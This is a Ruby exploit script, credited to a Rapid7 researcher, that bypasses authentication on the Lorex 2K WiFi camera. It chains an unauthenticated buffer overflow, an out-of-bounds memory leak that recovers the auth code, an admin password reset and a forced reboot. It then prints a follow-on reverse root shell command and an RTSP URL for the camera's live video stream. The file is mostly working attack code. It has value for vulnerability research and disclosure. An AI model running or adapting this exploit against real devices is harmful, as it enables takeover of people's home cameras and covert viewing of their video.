# frozen_string_literal: true

# Auth bypass exploit, targeting the Lorex 2K WiFi Camera.
#
# Author: Stephen Fewer, Rapid7. Sept 6, 2024.

# NOTE: This exploit requires OpenSSL version 1.x and is not compatible with OpenSSL 3.x

require 'optparse'
require 'socket'
require 'digest'
require 'json'
require 'openssl'
require 'base64'
require 'pp'

class LOREX_AUTHBYPASS
  def initialize(options)
    @options = options
    @step = nil
  end

  def log(txt)
    $stdout.puts("[#{Time.now.strftime('%-d/%b/%Y %H:%M:%S')}] [+]#{@step.nil? ? '' : " Step #{@step}:"} #{txt}")
  end

  def log_error(txt)
    $stdout.puts("[#{Time.now.strftime('%-d/%b/%Y %H:%M:%S')}] [-]#{@step.nil? ? '' : " Step #{@step}:"} #{txt}")
  end

  def get_vopt(opt)
    @options[:versions][@options[:version]][opt]
  end

  def dhip_udp_send(command, id: 0, session_id: 0, recv_response: true)
    s = UDPSocket.new

    data = [
      0x20,
      0x50494844, # 'DHIP' magic value
      session_id,
      id,
      command.length,
      0,
      command.length,
      0
    ].pack('V*') << command

    s.send(data, 0, @options[:ip], @options[:dhip_port])

    return nil unless recv_response

    response, = s.recvfrom(8192)

    if response.nil? || (response.length <= 32)
      log_error 'Bad response'
      return nil
    end

    JSON.parse(response[32..response.length - 2])
  rescue JSON::ParserError
    log_error 'JSON parsing error'
    nil
  end

  def dhip_encrypt(data)
    aes_algo = 'AES-128-ECB'

    cipher = OpenSSL::Cipher.new(aes_algo) # I verified that its ECB

    cipher.encrypt

    aes_key = '41' * 16 # I dont think the input salt size matters, must be hex encoded.

    aes_key_raw = aes_key.scan(/../).map { |x| x.hex.chr }.join

    rsa = OpenSSL::PKey::RSA.new

    # NOTE: set_key requires OpenSSL version 1.x and is not compatible with OpenSSL 3.x
    rsa.set_key(OpenSSL::BN.new(@options[:pubkey_n], 16), OpenSSL::BN.new(@options[:pubkey_e], 16), 2)

    encrypted_salt = rsa.public_encrypt(aes_key_raw)

    cipher.key = aes_key_raw

    encrypted_data = cipher.update(data) + cipher.final

    [aes_algo, encrypted_salt.unpack1('H*'), Base64.strict_encode64(encrypted_data)]
  end

  def dhip_get_version
    command = {
      'method' => 'DHDiscover.search',
      'params' => {}
    }.to_json

    json = dhip_udp_send(command)

    return false if json.nil?

    if json.dig('params', 'deviceInfo', 'Port') != @options[:dp_port]
      log "Waring: DP Server port may be #{json.dig('params', 'deviceInfo', 'Port')}"
    end

    @options[:version] = json.dig('params', 'deviceInfo', 'Version')
    @options[:serialno] = json.dig('params', 'deviceInfo', 'SerialNo')
    @options[:mac] = json['mac']

    !(@options[:version].nil? || @options[:serialno].nil? || @options[:mac].nil?)
  end

  def dhip_get_publickey
    command = {
      'method' => 'Security.getEncryptInfo',
      'params' => {}
    }.to_json

    json = dhip_udp_send(command)

    return false if json.nil?

    if json.dig('params', 'result') != true
      log_error 'Security.getEncryptInfo failed'
      return false
    end

    pk = json.dig('params', 'pub').split(',')

    @options[:pubkey_n] = pk[0][2..]
    @options[:pubkey_e] = pk[1][2..]

    !(@options[:pubkey_n].nil? || @options[:pubkey_e].nil?)
  end

  def dhip_reset_password(authcode: '11223344', password: 'qwerty', recv_response: true)
    data = {
      'user' => 'admin',
      'auth' => authcode,
      'pwd' => password
    }.to_json

    cipher, salt, content = dhip_encrypt(data)

    command = {
      'method' => 'PasswdFind.resetPassword',
      'params' => {
        'cipher' => cipher,
        'salt' => salt,
        'content' => content
      }
    }.to_json

    json = dhip_udp_send(command, recv_response: recv_response)

    return false if json.nil?

    if json.dig('params', 'result') != true
      log_error 'PasswdFind.resetPassword failed'
      pp json
      return false
    end

    true
  end

  def dhip_check_authcode(authcode)
    data = {
      'authCode' => authcode
    }.to_json

    cipher, salt, content = dhip_encrypt(data)

    command = {
      'method' => 'PasswdFind.checkAuthCode',
      'params' => {
        'cipher' => cipher,
        'salt' => salt,
        'content' => content
      }
    }.to_json

    json = dhip_udp_send(command)

    return false if json.nil?

    if json.dig('params', 'result') != true
      #log_error 'PasswdFind.checkAuthCode failed'
      return false
    end

    true
  end

  def dhip_get_passwd_descript
    command = {
      'method' => 'PasswdFind.getDescript',
      'params' => {
        'name' => 'admin'
      }
    }.to_json

    json = dhip_udp_send(command)

    return false if json.nil?

    if json.dig('params', 'result') != true
      log_error 'PasswdFind.getDescript failed'
      pp json
      return false
    end

    true
  end

  def dhip_devinit_access_crash
    data = {
      'name' => 'admin',
      'pwd' => 0xDEADC0DE # Force sonia to crash if this is not a string.
    }.to_json

    cipher, salt, content = dhip_encrypt(data)

    command = {
      'method' => 'DevInit.access',
      'params' => {
        'cipher' => cipher,
        'salt' => salt,
        'content' => content
      }
    }.to_json

    log 'Triggering access violation...'

    dhip_udp_send(command, recv_response: false)

    true
  end

  def dp_server_overflow
    dp_overflow = String.new
    dp_overflow << 'D' * 128
    dp_overflow << 'SSSS' # padding
    dp_overflow << 'BBB4' # r4
    dp_overflow << 'BBB5' # r5
    dp_overflow << 'BBB6' # r6
    dp_overflow << 'BBB7' # r7
    dp_overflow << 'BBB8' # r8
    dp_overflow << 'BBB9' # r9
    dp_overflow << [get_vopt(:iqserver_thread_listen_handle) | 1].pack('V') # pc -> iq_server_api thread_listen_handle

    dp_data  = String.new
    dp_data << 'admin'
    dp_data << '&&'
    dp_data << dp_overflow

    dp_packet = [
      0xA0,
      0,
      0,
      0,
      dp_data.length,
      0,
      0,
      0,
      0,
      0,
      0
    ].pack('CCCCVVVVVVV') << dp_data

    log 'Connecting to DP server...'
    dp_sock = TCPSocket.new(@options[:ip], @options[:dp_port])

    log 'Triggering unauth overflow...'
    dp_sock.write(dp_packet)

    log 'Sleeping...'
    sleep(2)

    dp_sock.close

    true
  end

  def extract_secret(buffer, needle)
  
  secrets = []
  
  loop do
    posA = buffer.index(needle)

    break unless posA
    
    pp buffer[posA,32].inspect
    
    new_secrets = extract_secret_at_pos(buffer, posA)
    
    secrets += new_secrets if new_secrets
    
    buffer = buffer[(posA+needle.length)..]
    
    break if buffer.empty?
  end
  
  return nil if secrets.empty?
  
  pp secrets.inspect
  
  secrets
  end
  
  def extract_secret_at_pos(buffer, posA)

    posB = posA

    secret = String.new

    buffer = buffer.unpack('C*')

    while true
      c = buffer[posA - 1]
      break if c.nil? || (((c < '0'.ord) || (c > '~'.ord)) && (c != 10))

      secret = [c].pack('C') << secret
      posA -= 1
    end

    countB = 0

    while true
      c = buffer[posB]
      
      posB += 1
      countB += 1
      
      if c.nil? || (((c < '0'.ord) || (c > '~'.ord)) && (c != 10))
        break unless countB == (12 + 1 + 15)
      end
      
      secret << [c].pack('C')

      # we expect: 12 byte MAC, 1 \n char, 15 bytes random hex string.
      # if we read further, we get unexpected adjacent memory and fail to gen the
      # correct auth code.
      next unless countB == (12 + 1 + 15)

      # sometimes the last leaked char buffer[posB-1] will not be hex [0-9A-F] (seems to be munged in memory).
      # We return an array of 16 possible secrets, replacing this last char.
      # if buffer[posB] == 10 (\n) we are probably good.
      if (c < '0'.ord) || (c > '9'.ord && (c < 'A'.ord || c > 'F'.ord)) || buffer[posB] != 10
        arr = []
        
        # If we dont see a \n after the leaked secret, but the last char is valid hex, then add this secret as-is.
        # Its probably correct, so as the first item in the array, we end up trying it first and succeeding.
        # The remaining array items are there as fall back.
        if ((c >= '0'.ord) && (c >= '9'.ord)) || ((c >= 'A'.ord) && (c >= 'F'.ord))
          new_secret = secret.dup
          new_secret << [10, 0].pack('CC')
          arr << new_secret
        end
        
        0.upto(15) do |h|
          new_secret = secret.dup
          new_secret[-1] = [(h > 9 ? 'A' : '0').ord + h - (h > 9 ? 10 : 0)].pack('C')
          new_secret << [10, 0].pack('CC')
          arr << new_secret
        end
        
        return arr
      end
      
      secret << [10, 0].pack('CC')
      
      return [secret]

    end

    nil
  end

  def hash_secret(secret)
    digest = Digest::MD5.hexdigest(secret).upcase

    result = String.new

    idx = 0

    while idx != 8
      result << if (idx % 3) != 0
                  if (idx % 7) != 0
                    digest[(idx * 4)]
                  else
                    digest[(idx * 4) + 1]
                  end
                else
                  digest[(idx * 4) + 3]
                end
      idx += 1
    end

    result.downcase
  end

  def iq_service_leak
    threads = []

    running = true

    lock = Mutex.new

    log 'Begin leak...'

    dhip_get_passwd_descript

    threads << Thread.new do
      while running

        oob_read_length = 0

        oob_read_1k_limit = 48 # Read a max of 48Kb OOB in 1Kb increments. Too much and we may segfault.

        $stdout.write('C')

        iq_sock = TCPSocket.new(@options[:ip], @options[:iq_port]) # XXX: gracefully handle conn timeout, sleep/retry

        0.upto(128) do |idx| # XXX: should this be infinite, we cant continue unless this works?
          $stdout.write(idx > 16 ? '~' : '.')

          max_words = ((51_200 - 8) / 4) + (oob_read_length / 4)

          iq_data = [
            0x2803, # ID
            max_words # OOB read length (in word size)
          ].pack('vv')

          iq_packet = [
            6, # MI_IQSERVER_GetApi
            iq_data.length
          ].pack('VV') << iq_data

          iq_sock.write(iq_packet)

          response_header = iq_sock.recv(8)

          break if response_header.nil?

          break if response_header.length != 8

          _, resp_data_len = response_header.unpack('VV')

          resp_data = String.new

          while resp_data_len != 0
            data = iq_sock.recv(resp_data_len)

            if data.nil?
              log_error "data.nil (resp_data_len=#{resp_data_len})"
              break
            end

            resp_data << data

            resp_data_len -= data.length
          end

          if resp_data.include?(@options[:serialno])

            needle = @options[:mac].gsub(':', '').upcase

            secret_array = extract_secret(resp_data, needle)

            if secret_array

              log "DEBUG: idx=#{idx}, oob_read_length=#{oob_read_length}, oob_read_1k_limit=#{oob_read_1k_limit}"

              secret_array.each do |secret|

                authcode = hash_secret(secret)

                running = lock.synchronize do
                  if dhip_check_authcode(authcode)

                    $stdout.write("\n")

                    log "Leaked secret: #{secret.inspect}"

                    @options[:authcode] = authcode

                    log "Generated a valid auth code: #{authcode}"
                    break false
                  end

                  log_error "Not a valid auth code: #{authcode} (#{secret.inspect})"
                  break true
                end

                break unless running
              end

              break unless running
            end
          end

          sleep(0.3)

          oob_read_length += 1024 if idx > 16 && (idx - 16 < oob_read_1k_limit) # XXX 1024
        end

        iq_sock.close

        $stdout.write('S')

        sleep(1) if running

        oob_read_1k_limit += 8 if oob_read_1k_limit < 48
      end
    end

    sleep(1)

    threads << Thread.new do
      while running

        0.upto(128) do
          lock.synchronize do
            $stdout.write('>')
            dhip_reset_password(recv_response: false)
          end
          sleep(0.1)
          break unless running
        end

        sleep(1)
      end
    end

    threads.each do |thread|
      thread.join
    end

    log 'Finished leak...'

    !@options[:authcode].nil?
  end

  def main
    log 'Starting...'

    log "Targeting: #{@options[:ip]}"

    #
    # Step 0: Target version detection (and check), and get public key.
    #
    @step = 0

    unless dhip_get_version
      log_error 'Failed to get version information'
      return false
    end

    log "Detected Version: #{@options[:version]}"
    log "Detected SerialNo: #{@options[:serialno]}"
    log "Detected MAC: #{@options[:mac]}"

    unless @options[:versions].key? @options[:version]
      log_error 'We dont have suport for this version'
      return false
    end

    unless dhip_get_publickey
      log_error 'Failed to get public key'
      return false
    end

    # XXX: do we need to getPasswdDescript once to generate the auth code a first time?
    # XXX: what about on a factory reset device?

    if @options[:authcode].nil?
      #
      # Step 1: unauth overflow -> start IQ service.
      #
      @step = 1

      unless dp_server_overflow
        log_error 'Failed to perform DP server overflow'
        return false
      end

      #
      # Step 2: IQ service OOB read to leak the auth code secrets.
      #
      @step = 2

      unless iq_service_leak
        log_error 'Failed to perform IQ server leak'
        return false
      end
    end

    #
    # Step 3: Reset admin password.
    #
    @step = 3

    unless dhip_reset_password(authcode: @options[:authcode], password: @options[:password])
      log_error 'Failed to reset admin password'
      return false
    end

    log "Admin password: #{@options[:password]}"

    #
    # Step 4: Reboot device.
    #
    @step = 4

    unless dhip_devinit_access_crash
      log_error 'Failed to reboot the device'
      return false
    end

    log 'Device rebooting...'

    true
  ensure
    @step = nil

    log 'Finished.'
  end
end

options = {
  ip: nil,
  password: 'Hacking3!',
  dhip_port: 37_810,
  dp_port: 35_000,
  iq_port: 9876,
  versions: {
    '2.800.030000000.3.R' => {
      iqserver_thread_listen_handle: 0x001CC0B0 # sonia!thread_listen_handle
    },
    '2.800.020000000.3.R' => {
      iqserver_thread_listen_handle: 0x001CC0B0 # sonia!thread_listen_handle
    }    
  },
  version: nil,
  serialno: nil,
  mac: nil,
  pubkey_n: nil,
  pubkey_e: nil,
  authcode: nil
}

OptionParser.new do |opts|
  opts.banner = "Usage: #{$PROGRAM_NAME} [options]"

  opts.on('-t', '--target TARGET', 'Target IP') do |v|
    options[:ip] = v
  end

  opts.on('-p', '--password PASSWORD', 'Set admin password') do |v|
    options[:password] = v
  end

  opts.on('-a', '--authcode AUTHCODE', 'Set authcode to use') do |v|
    options[:authcode] = v
  end
end.parse!

if options[:ip].nil?
  warn('[-] Error, you must pass a target IP: -t TARGET')
  return
end

# By default the password must conform to this complexity:
# {"PwdSpeci"=>{"Limit"=>[8, 32], "Type"=>["Number", "Lower", "Upper"], "CharList"=>"~!@\#$%^", "Combine"=>2}}}}
if options[:password].length < 8 || options[:password].length > 32
  warn('[-] Error, you must pass a password that meets the devices complexity: -p PASSWORD')
  return
end

unless OpenSSL::OPENSSL_VERSION.include? "OpenSSL 1."
  warn('[-] Error, you must use OpenSSL version 1.x as we need to call set_key. Try Ruby 3.1.3.')
  return
end

if LOREX_AUTHBYPASS.new(options).main
  lhost_ip = Socket.ip_address_list.detect { |intf|intf.ipv4_private?}&.ip_address
  $stdout.puts('###')
  $stdout.puts("# Root Shell: ruby LOREX_RCE.rb -t #{options[:ip]} -p #{options[:password]} --lhost #{lhost_ip} --lport 4444")
  $stdout.puts("# RTSP Stream: rtsp://admin:#{options[:password]}@#{options[:ip]}:554/cam/realmonitor?channel=1&subtype=0")
  $stdout.puts('###')
end
